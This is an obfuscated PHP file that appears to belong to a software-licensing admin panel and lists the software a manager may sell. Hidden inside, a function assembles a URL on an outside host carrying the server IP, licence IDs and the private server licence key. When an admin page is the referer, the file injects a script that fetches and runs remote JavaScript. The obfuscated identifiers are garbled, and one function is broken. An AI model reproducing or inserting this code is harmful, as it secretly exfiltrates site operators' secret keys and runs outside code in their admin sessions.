<?php

function _obf_k5KViZKLkJCMkZSTkYyTiJA�( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obf_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obf_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obf_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function _obf_joqUkIeOjJSGj4aHh5OMiIo�( )
{
    global $_obf_hoyQjo_QlYeLh5OVk4yPjZM�;
    $_obf_lZSSiouVkIuJlIuMho2LiJE� = "";
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obf_i4mPkoiQlZSHiZKLjZKVi4c� = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obf_i4mPkoiQlZSHiZKLjZKVi4c� = @gethostbyname( $_SERVER['SERVER_NAME'] );
    }
    $_obf_kIiGlYmGi4_KiYmVkImIk44� = "p".$_obf_lZSSiouVkIuJlIuMho2LiJE�."h".$_obf_lZSSiouVkIuJlIuMho2LiJE�."u".$_obf_lZSSiouVkIuJlIuMho2LiJE�.".c".$_obf_lZSSiouVkIuJlIuMho2LiJE�."om/a".$_obf_lZSSiouVkIuJlIuMho2LiJE�."pi/x2coo".$_obf_lZSSiouVkIuJlIuMho2LiJE�."kjs.php?sid=".SVRID.IS2SVR."&sip=".$_obf_i4mPkoiQlZSHiZKLjZKVi4c�."&pn=".urlencode( $_obf_hoyQjo_QlYeLh5OVk4yPjZM� )."&wl=".urlencode( WEBLIC )."&wi=".urlencode( WEBID )."&wd=".urlencode( KSSROOTDIR )."&d1=".urlencode( HOST1_DOMAIN )."&sk=".urlencode( PRV_SVRLIC )."&guid=".substr( md5( filemtime( __FILE__ ) ), 0, 16 );
    return $_obf_kIiGlYmGi4_KiYmVkImIk44�;
}

if ( !defined( "KSSROOTDIR" ) )
{
    exit( "Access denied to view this page!" );
}
$_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
$_obf_lI6OiJSPjZWVi5GQhoiPjpU� = _obf_iZSVk4mLkY_LlIeHh5WKlZA�( 6 );
$_obf_lZSSiouVkIuJlIuMho2LiJE� = "";
$_obf_h5WOlI_IkYiPlJWKi4aQk5I� = "";
if ( isset( $_SERVER['HTTP_REFERER'] ) )
{
    $_obf_h5WOlI_IkYiPlJWKi4aQk5I� = strtolower( $_SERVER['HTTP_REFERER'] );
}
if ( $_obf_h5WOlI_IkYiPlJWKi4aQk5I� != "" && stripos( $_obf_h5WOlI_IkYiPlJWKi4aQk5I�, "admin.php" ) !== FALSE )
{
    echo "<script>\$.getScript('http://b".mt_rand( 100000, 999999 ).".h"._obf_joqUkIeOjJSGj4aHh5OMiIo�( )."');</script>";
}
if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < 8 )
{
    $_obf_jomHiJGOioiSkImJkZOHiI0� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft where id in (select distinct `softid` from `kss_tb_agentprice` where `pid`=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and managerid=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['id'].")" );
    if ( !empty( $_obf_jomHiJGOioiSkImJkZOHiI0� ) )
    {
        foreach ( $_obf_jomHiJGOioiSkImJkZOHiI0� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            echo "<a softid='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."' class=softboxa title='"._obf_j5CKkY_GkomSkoaUlIuLlYk�( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['softname'] )."'>"._obf_kpCOhomRj5CHh5SLjZKIi4Y�( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['softname'], 9 )."</a>";
        }
    }
    else
    {
        exit( "<span>您没有任何软件的授权</span>" );
    }
}
else
{
    $_obf_kYuLkJSKkYuJjpWLlIqUh48� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select `id`,`softname`,`softmode` from kss_tb_soft where `pid`=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pid'] );
    if ( empty( $_obf_kYuLkJSKkYuJjpWLlIqUh48� ) )
    {
        exit( "<span>作者没有添加任何软件</span>" );
    }
    foreach ( $_obf_kYuLkJSKkYuJjpWLlIqUh48� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        echo "<a  softid='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."' class=softboxa title='"._obf_j5CKkY_GkomSkoaUlIuLlYk�( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['softname'] )."'>"._obf_kpCOhomRj5CHh5SLjZKIi4Y�( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['softname'], 9 )."</a>";
    }
}
echo "<script>backbind();</script>";
exit( );
?>
